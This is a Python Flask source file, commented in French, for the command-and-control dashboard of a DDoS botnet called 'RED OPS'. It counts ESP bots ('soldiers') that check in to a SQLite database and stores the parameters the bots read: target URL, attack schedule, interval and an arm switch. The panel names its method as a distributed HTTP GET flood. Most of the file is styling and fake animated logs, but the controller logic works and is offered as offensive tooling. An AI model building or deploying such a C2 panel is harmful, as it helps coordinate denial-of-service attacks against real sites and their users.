import json
import os
import time
import random
import sqlite3
from flask import Flask, request, render_template_string

# ==============================================================================
# CONFIGURATION & BACKEND
# ==============================================================================

app = Flask(__name__)
CONFIG_FILE = 'config.json'
DB_NAME = "botnet.db"

# --- GESTION BASE DE DONNEES (Pour compter les soldats) ---
def get_online_count(timeout=70):
    """Compte les ESP actifs dans les 70 dernières secondes"""
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        # Création table si elle n'existe pas (sécurité)
        c.execute('''CREATE TABLE IF NOT EXISTS soldiers (token TEXT PRIMARY KEY, ip TEXT, last_seen REAL)''')
        limit = time.time() - timeout
        c.execute("SELECT COUNT(*) FROM soldiers WHERE last_seen > ?", (limit,))
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

# --- GESTION CONFIGURATION ---
def load_config():
    default = {
        "active": False, 
        "target_url": "http://192.168.1.50", 
        "start_h": 0, "start_m": 0, 
        "stop_h": 23, "stop_m": 59, 
        "interval": 60
    }
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f: json.dump(default, f)
        return default
    try:
        with open(CONFIG_FILE, 'r') as f: return json.load(f)
    except: return default

def save_config(data):
    with open(CONFIG_FILE, 'w') as f: json.dump(data, f, indent=4)

# ==============================================================================
# ROUTE PRINCIPALE & INTERFACE
# ==============================================================================

@app.route('/', methods=['GET', 'POST'])
def dashboard():
    config = load_config()
    online_bots = get_online_count()
    notification = None
    
    if request.method == 'POST':
        new_conf = {
            "active": True if request.form.get('active') else False,
            "target_url": request.form.get('target_url'),
            "start_h": int(request.form.get('start_h')), 
            "start_m": int(request.form.get('start_m')),
            "stop_h": int(request.form.get('stop_h')), 
            "stop_m": int(request.form.get('stop_m')),
            "interval": int(request.form.get('interval'))
        }
        save_config(new_conf)
        config = new_conf
        notification = "CONFIGURATION MISE À JOUR. SYNCHRONISATION DU SWARM..."

    # --- GENERATION DU HTML MASSIF ---
    html = """
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>RED OPS // C2 SERVER</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        
        <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">

        <style>
            /* * ==========================================
             * CORE CSS VARIABLES & RESET
             * ==========================================
             */
            :root {
                --bg-color: #050505;
                --panel-bg: rgba(20, 20, 25, 0.85);
                --neon-red: #ff003c;
                --neon-blue: #00f3ff;
                --neon-green: #00ff41;
                --text-main: #e0e0e0;
                --grid-color: rgba(0, 243, 255, 0.1);
                --border-radius: 2px;
            }

            * { box-sizing: border-box; }
            
            body {
                background-color: var(--bg-color);
                color: var(--text-main);
                font-family: 'Share Tech Mono', monospace;
                overflow-x: hidden;
                margin: 0;
                padding-bottom: 50px;
            }

            /* --- EFFET MATRIX BACKGROUND --- */
            #matrix-canvas {
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                z-index: -2;
                opacity: 0.15;
            }

            /* --- EFFET SCANLINES (CRT) --- */
            .scanlines {
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                background: linear-gradient(
                    to bottom,
                    rgba(255,255,255,0),
                    rgba(255,255,255,0) 50%,
                    rgba(0,0,0,0.2) 50%,
                    rgba(0,0,0,0.2)
                );
                background-size: 100% 4px;
                z-index: -1;
                pointer-events: none;
            }

            /* --- LAYOUT & CONTAINERS --- */
            .main-wrapper {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
                position: relative;
                z-index: 1;
            }

            .cyber-panel {
                background: var(--panel-bg);
                border: 1px solid #333;
                border-left: 3px solid var(--neon-red);
                margin-bottom: 25px;
                padding: 20px;
                position: relative;
                box-shadow: 0 0 15px rgba(0,0,0,0.7);
                backdrop-filter: blur(5px);
            }
            
            /* Coins décoratifs */
            .cyber-panel::after {
                content: ''; position: absolute; top: -1px; right: -1px;
                width: 20px; height: 20px;
                border-top: 2px solid var(--neon-red);
                border-right: 2px solid var(--neon-red);
            }

            /* --- TYPOGRAPHY --- */
            h1, h2, h3, h4 {
                font-family: 'Orbitron', sans-serif;
                text-transform: uppercase;
                letter-spacing: 3px;
                color: white;
                text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
            }
            
            .text-glitch { animation: glitch 1s linear infinite; }
            @keyframes glitch {
                2%, 64% { transform: translate(2px,0) skew(0deg); }
                4%, 60% { transform: translate(-2px,0) skew(0deg); }
                62% { transform: translate(0,0) skew(5deg); }
            }

            /* --- HEADER & STATUS BAR --- */
            .top-bar {
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid var(--neon-red);
                padding-bottom: 15px;
                margin-bottom: 30px;
            }
            
            .status-badge {
                border: 1px solid var(--neon-blue);
                color: var(--neon-blue);
                padding: 5px 15px;
                font-size: 0.9em;
                background: rgba(0, 243, 255, 0.1);
            }
            
            .blink-red { animation: blinkRed 1s infinite; }
            @keyframes blinkRed { 50% { opacity: 0.3; color: red; } }

            /* --- CAROUSEL STYLISÉ --- */
            .carousel-custom {
                border: 1px solid var(--neon-red);
                height: 300px;
                overflow: hidden;
                position: relative;
            }
            .carousel-item {
                height: 300px;
                background-size: cover;
                background-position: center;
            }
            .carousel-caption {
                background: rgba(0,0,0,0.8);
                border-top: 2px solid var(--neon-red);
                width: 100%; left: 0; bottom: 0;
                padding: 10px;
                text-align: left;
                padding-left: 20px;
            }

            /* --- FORMULAIRES --- */
            label {
                color: var(--neon-blue);
                font-size: 0.8rem;
                margin-bottom: 8px;
                display: block;
            }
            
            .form-control {
                background: rgba(0,0,0,0.6);
                border: 1px solid #444;
                color: white;
                font-family: 'Share Tech Mono', monospace;
                border-radius: 0;
            }
            .form-control:focus {
                background: black;
                border-color: var(--neon-red);
                color: var(--neon-red);
                box-shadow: 0 0 10px rgba(255, 0, 60, 0.3);
            }

            /* Bouton Principal */
            .btn-nuke {
                background: linear-gradient(45deg, #800000, #ff0000);
                color: white;
                border: none;
                width: 100%;
                padding: 20px;
                font-size: 1.5rem;
                font-weight: bold;
                letter-spacing: 5px;
                text-transform: uppercase;
                border: 1px solid var(--neon-red);
                transition: 0.3s;
                position: relative;
                overflow: hidden;
            }
            .btn-nuke:hover {
                background: #ff0000;
                box-shadow: 0 0 30px var(--neon-red);
                text-shadow: 0 0 10px white;
                color: black;
            }

            /* --- TERMINAL WINDOW --- */
            .terminal-window {
                background: black;
                border: 1px solid #333;
                height: 300px;
                padding: 10px;
                overflow-y: hidden;
                font-size: 0.85rem;
                position: relative;
            }
            .terminal-header {
                background: #222;
                color: #aaa;
                padding: 2px 10px;
                font-size: 0.7rem;
                border-bottom: 1px solid #444;
                margin: -10px -10px 10px -10px;
            }
            .log-entry { margin-bottom: 2px; }
            .log-time { color: #666; margin-right: 5px; }
            .log-info { color: var(--neon-blue); }
            .log-warn { color: orange; }
            .log-err { color: var(--neon-red); }

            /* --- BOT COUNTER --- */
            .bot-count-display {
                font-size: 4rem;
                color: var(--neon-green);
                text-align: center;
                text-shadow: 0 0 20px var(--neon-green);
                border: 1px solid var(--neon-green);
                padding: 10px;
                background: rgba(0, 255, 65, 0.05);
            }

        </style>
    </head>
    <body>

        <canvas id="matrix-canvas"></canvas>
        <div class="scanlines"></div>

        <div class="main-wrapper">
            
            <div class="top-bar">
                <div>
                    <h1 class="mb-0"><i class="fas fa-biohazard text-danger"></i> RED OPS <span style="font-size:0.5em">FRAMEWORK</span></h1>
                    <small style="color:#666">C2 SERVER // ADMIN NODE // PORT 8080</small>
                </div>
                <div class="text-end">
                    <div class="status-badge mb-1">SYSTEM ONLINE</div>
                    <div class="status-badge" style="border-color:var(--neon-red); color:var(--neon-red)">
                        <i class="fas fa-lock"></i> SECURE CONNECTION
                    </div>
                </div>
            </div>

            {% if notification %}
            <div class="alert alert-dark border border-danger text-danger text-center fw-bold mb-4 shadow-lg">
                <i class="fas fa-exclamation-triangle"></i> {{ notification }}
            </div>
            {% endif %}

            <div class="row">
                
                <div class="col-lg-4">
                    
                    <div class="cyber-panel">
                        <h4 class="text-center mb-3"><i class="fas fa-users"></i> SWARM SIZE</h4>
                        <div class="bot-count-display">
                            {{ online_bots }}
                        </div>
                        <div class="text-center mt-2 text-muted">
                            <small>AGENTS CONNECTÉS (LIVE)</small>
                        </div>
                    </div>

                    <div class="cyber-panel">
                        <h4><i class="fas fa-chart-line"></i> NETWORK LOAD</h4>
                        <canvas id="trafficChart" height="150"></canvas>
                    </div>

                    <div class="cyber-panel p-0">
                        <div class="terminal-window" id="terminal">
                            <div class="terminal-header">ROOT@C2-SERVER:~# tail -f /var/log/botnet.log</div>
                            <div id="log-content"></div>
                        </div>
                    </div>

                </div>

                <div class="col-lg-8">
                    
                    <div class="cyber-panel p-0 mb-4">
                        <div id="targetCarousel" class="carousel slide carousel-custom" data-bs-ride="carousel">
                            <div class="carousel-inner">
                                <div class="carousel-item active" style="background-image: url('https://media.istockphoto.com/id/1144604620/photo/data-center-server-room.jpg?s=612x612&w=0&k=20&c=6cW_C60_KipfQeHkM5qQoWq_b4gYqJgLgq_JgLgq_Jg=');">
                                    <div class="carousel-caption">
                                        <h3><i class="fas fa-server"></i> INFRASTRUCTURE CIBLE</h3>
                                        <p class="mb-0">Cible : <span style="color:var(--neon-blue)">{{ config.target_url }}</span></p>
                                    </div>
                                </div>
                                <div class="carousel-item" style="background-image: url('https://media.istockphoto.com/id/1310651347/photo/hacker-using-laptop-with-binary-code-digital-interface.jpg?s=612x612&w=0&k=20&c=1310651347');">
                                    <div class="carousel-caption">
                                        <h3><i class="fas fa-code-branch"></i> PROTOCOLE D'ATTAQUE</h3>
                                        <p class="mb-0">Méthode : HTTP GET FLOOD DISTRIBUÉ</p>
                                    </div>
                                </div>
                                <div class="carousel-item" style="background-image: url('https://media.istockphoto.com/id/1186938036/photo/global-network-connection-concept.jpg?s=612x612&w=0&k=20&c=1186938036');">
                                    <div class="carousel-caption">
                                        <h3><i class="fas fa-globe"></i> COUVERTURE MONDIALE</h3>
                                        <p class="mb-0">Nœuds actifs : {{ online_bots }}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <form method="POST" class="cyber-panel">
                        <div class="d-flex justify-content-between align-items-center border-bottom border-secondary pb-3 mb-4">
                            <h3 class="mb-0 text-white"><i class="fas fa-cogs"></i> PARAMÈTRES DE MISSION</h3>
                            <div class="form-check form-switch">
                                <label class="form-check-label text-white fw-bold me-3" for="activeSwitch">ARMER LE SYSTÈME</label>
                                <input class="form-check-input" type="checkbox" id="activeSwitch" name="active" value="1" 
                                       style="width: 60px; height: 30px; background-color:#333; border-color:#666;" 
                                       {% if config.active %}checked{% endif %}>
                            </div>
                        </div>

                        <div class="mb-4">
                            <label><i class="fas fa-bullseye"></i> URL / IP CIBLE</label>
                            <div class="input-group">
                                <span class="input-group-text bg-dark border-secondary text-danger"><i class="fas fa-link"></i></span>
                                <input type="text" class="form-control form-control-lg" name="target_url" value="{{ config.target_url }}" placeholder="http://exemple.com">
                            </div>
                        </div>

                        <div class="row mb-4">
                            <div class="col-md-4">
                                <label>HEURE DÉBUT (HH:MM)</label>
                                <div class="input-group">
                                    <input type="number" class="form-control text-center" name="start_h" min="0" max="23" value="{{ config.start_h }}">
                                    <span class="input-group-text bg-dark border-secondary">:</span>
                                    <input type="number" class="form-control text-center" name="start_m" min="0" max="59" value="{{ config.start_m }}">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <label>HEURE FIN (HH:MM)</label>
                                <div class="input-group">
                                    <input type="number" class="form-control text-center" name="stop_h" min="0" max="23" value="{{ config.stop_h }}">
                                    <span class="input-group-text bg-dark border-secondary">:</span>
                                    <input type="number" class="form-control text-center" name="stop_m" min="0" max="59" value="{{ config.stop_m }}">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <label>INTERVALLE (SEC)</label>
                                <div class="input-group">
                                    <span class="input-group-text bg-dark border-secondary text-info"><i class="fas fa-tachometer-alt"></i></span>
                                    <input type="number" class="form-control text-center" name="interval" min="1" value="{{ config.interval }}">
                                </div>
                            </div>
                        </div>

                        <button type="submit" class="btn-nuke mt-2">
                            <i class="fas fa-radiation"></i> INITIALISER LA SÉQUENCE
                        </button>
                    </form>

                </div>
            </div>
            
            <div class="text-center mt-4 text-muted">
                <small>RED OPS FRAMEWORK v3.2.1-STABLE // UNAUTHORIZED ACCESS IS PROHIBITED</small>
            </div>

        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        
        <script>
            // --- 1. MATRIX RAIN EFFECT ---
            const canvas = document.getElementById('matrix-canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポvu0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const nums = '0123456789';
            const alphabet = katakana + latin + nums;

            const fontSize = 16;
            const columns = canvas.width/fontSize;
            const drops = [];

            for( let x = 0; x < columns; x++ ) { drops[x] = 1; }

            const draw = () => {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px monospace';

                for( let i = 0; i < drops.length; i++ ) {
                    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                    ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                    if( drops[i]*fontSize > canvas.height && Math.random() > 0.975 )
                        drops[i] = 0;
                    drops[i]++;
                }
            };
            setInterval(draw, 30);

            // --- 2. TRAFFIC CHART (Chart.js) ---
            const ctxChart = document.getElementById('trafficChart').getContext('2d');
            const trafficChart = new Chart(ctxChart, {
                type: 'line',
                data: {
                    labels: ['00', '05', '10', '15', '20', '25', '30', '35', '40', '45'],
                    datasets: [{
                        label: 'Paquets / Sec',
                        data: [12, 19, 3, 5, 2, 3, 20, 35, 40, 45],
                        borderColor: '#00f3ff',
                        backgroundColor: 'rgba(0, 243, 255, 0.1)',
                        borderWidth: 1,
                        fill: true,
                        tension: 0.4
                    }]
                },
                options: {
                    responsive: true,
                    plugins: { legend: { display: false } },
                    scales: {
                        x: { display: false },
                        y: { 
                            grid: { color: '#333' },
                            ticks: { color: '#666' }
                        }
                    },
                    animation: { duration: 0 }
                }
            });

            // Mise à jour fake du graph
            setInterval(() => {
                const data = trafficChart.data.datasets[0].data;
                data.shift();
                data.push(Math.floor(Math.random() * 50) + 10);
                trafficChart.update();
            }, 1000);

            // --- 3. TERMINAL LOGGER ---
            const logContent = document.getElementById('log-content');
            const messages = [
                "Scanning ports...", 
                "Handshake established with Node-42",
                "Heartbeat received from ESP32-AF5",
                "Updating routing table...",
                "Target latency: 24ms",
                "Analyzing packets...",
                "Waiting for command...",
                "Syncing database...",
                "Encryption keys rotated.",
                "Memory usage: 34%"
            ];

            function addLog() {
                const now = new Date();
                const time = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
                const msg = messages[Math.floor(Math.random() * messages.length)];
                
                const div = document.createElement('div');
                div.className = 'log-entry';
                div.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-info">${msg}</span>`;
                
                logContent.appendChild(div);
                
                // Auto scroll
                const terminal = document.getElementById('terminal');
                terminal.scrollTop = terminal.scrollHeight;
                
                // Limite le nombre de lignes
                if (logContent.childElementCount > 20) {
                    logContent.removeChild(logContent.firstChild);
                }
            }
            setInterval(addLog, 1500);

        </script>
    </body>
    </html>
    """
    
    return render_template_string(html, config=config, notification=notification, online_bots=online_bots)

# ==============================================================================
# LANCEMENT DU SERVEUR
# ==============================================================================
if __name__ == '__main__':
    print("--- ☢️  INTERFACE RED OPS C2 INITIALISÉE ☢️  ---")
    print(">>> ACCÈS LOCAL : http://localhost:8080")
    # Lancement sur le port 8080 (Privé)
    app.run(host='0.0.0.0', port=8080)